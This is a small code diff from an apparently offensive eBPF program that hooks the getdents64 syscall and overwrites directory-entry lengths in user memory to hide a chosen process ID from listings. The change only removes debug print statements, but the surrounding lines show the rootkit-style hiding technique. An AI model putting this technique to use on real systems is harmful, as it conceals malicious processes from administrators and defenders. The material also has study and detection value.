@@ -210,16 +210,7 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
       (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
   short unsigned int d_reclen = 0;
   bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
-
-  // Debug print
-  char filename[MAXPIDLEN];
-  bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
-  filename[pid_to_hide_len - 1] = 0x00;
-  bpf_printk("[PID_HIDE] filename previous %s\n", filename);
-  bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
-  filename[pid_to_hide_len - 1] = 0x00;
-  bpf_printk("[PID_HIDE] filename next one %s\n", filename);
-
+  
   // Attempt to overwrite
   short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
   long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new,
